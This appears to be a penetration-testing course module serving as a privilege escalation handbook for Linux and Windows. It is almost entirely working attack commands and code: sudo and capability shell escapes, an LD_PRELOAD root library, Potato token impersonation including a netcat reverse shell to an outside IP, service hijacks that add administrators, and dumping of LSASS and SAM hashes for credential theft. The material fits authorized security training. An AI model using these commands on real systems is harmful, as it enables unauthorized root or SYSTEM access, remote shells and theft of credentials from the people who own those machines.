# Module 05: Linux & Windows Privilege Escalation Handbook

Complete tactical reference for escalating unprivileged access to `root` on Linux and `NT AUTHORITY\SYSTEM` on Windows.

---

## Part 1: Linux Privilege Escalation

### 1. Initial Reconnaissance Commands
```bash
whoami && id                       # User, UID, and group memberships
uname -a                           # Kernel release and OS architecture
sudo -l                            # Sudo permissions for current user
cat /etc/passwd                    # User list and login shells
find / -perm -u=s -type f 2>/dev/null # Find SUID binaries
getcap -r / 2>/dev/null            # Linux capabilities
cat /etc/crontab /etc/cron.*/*     # Scheduled cron jobs
netstat -tulpn || ss -tulpn        # Listening ports (look for localhost:3306, 5432, 8080)
```

### 2. Sudo Misconfigurations & GTFOBins
If `sudo -l` reveals permissions:
- `(root) NOPASSWD: /usr/bin/vim`:
  ```bash
  sudo vim -c ':!/bin/sh'
  ```
- `(root) NOPASSWD: /usr/bin/find`:
  ```bash
  sudo find . -exec /bin/sh \; -quit
  ```
- `(root) NOPASSWD: /usr/bin/python3`:
  ```bash
  sudo python3 -c 'import os; os.system("/bin/bash")'
  ```
- `env_keep += LD_PRELOAD`:
  Write custom C shared library:
  ```c
  // root_preload.c
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
  ```
  Compile and run:
  ```bash
  gcc -fPIC -shared -o root_preload.so root_preload.c -nostartfiles
  sudo LD_PRELOAD=/tmp/root_preload.so <allowed_sudo_command>
  ```

### 3. SUID Binaries & Shared Library Hijacking
Inspect custom SUID binaries with `strings`, `ltrace`, or `strace`:
```bash
# Check shared libraries loaded by binary
strace /usr/local/bin/custom_suid 2>&1 | grep -iE 'open|access'
# If it attempts to load a non-existent /tmp/libcustom.so, create it and gain root.
```

### 4. Linux Capabilities Abuse
```bash
# If python or perl has cap_setuid
getcap -r / 2>/dev/null
# Output: /usr/bin/python3.10 = cap_setuid+ep
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Part 2: Windows Privilege Escalation

### 1. Initial Reconnaissance Commands
```cmd
whoami /all                        :: Token privileges and group memberships
systeminfo                         :: OS version, architecture, hotfixes installed
net user %username%                :: User account details
netstat -ano | findstr LISTENING   :: Internal network services
cmdkey /list                       :: Stored credentials
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
```

### 2. Token Impersonation (The Potato Family)
Check `whoami /priv`. If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled:
- **GodPotato** (Universal on modern Windows):
  ```cmd
  GodPotato-NET4.exe -cmd "cmd.exe /c net localgroup Administrators <username> /add"
  GodPotato-NET4.exe -cmd "cmd.exe /c C:\nc.exe 10.10.14.5 4444 -e cmd.exe"
  ```
- **PrintSpoofer**:
  ```cmd
  PrintSpoofer64.exe -i -c cmd
  ```

### 3. Service Misconfigurations
- **Unquoted Service Paths**:
  ```cmd
  :: Find unquoted service paths set to start automatically
  wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
  ```
  If path is `C:\Program Files\Vulnerable Service\agent.exe`:
  - Place payload at `C:\Program Files\Vulnerable.exe` or `C:\Program.exe`.
  - Restart service: `net stop "ServiceName" && net start "ServiceName"`.

- **Weak Service Permissions**:
  Using `accesschk.exe` from Sysinternals:
  ```cmd
  accesschk.exe /accepteula -uwcqv "Authenticated Users" *
  # If SERVICE_CHANGE_CONFIG permission is granted:
  sc config VulnService binPath= "net localgroup Administrators lowpriv /add"
  sc stop VulnService
  sc start VulnService
  ```

### 4. Credential Harvesting & LSASS Dumping
- Dumping LSASS via Task Manager or Sysinternals `procdump`:
  ```cmd
  procdump.exe -ma lsass.exe lsass.dmp
  ```
  Extract secrets on Kali using `pypykatz`:
  ```bash
  pypykatz lsa minidump lsass.dmp
  ```
- Extracting SAM and SYSTEM hives:
  ```cmd
  reg save HKLM\SAM sam.save
  reg save HKLM\SYSTEM system.save
  ```
  Extract hashes on Kali:
  ```bash
  impacket-secretsdump -sam sam.save -system system.save LOCAL
  ```
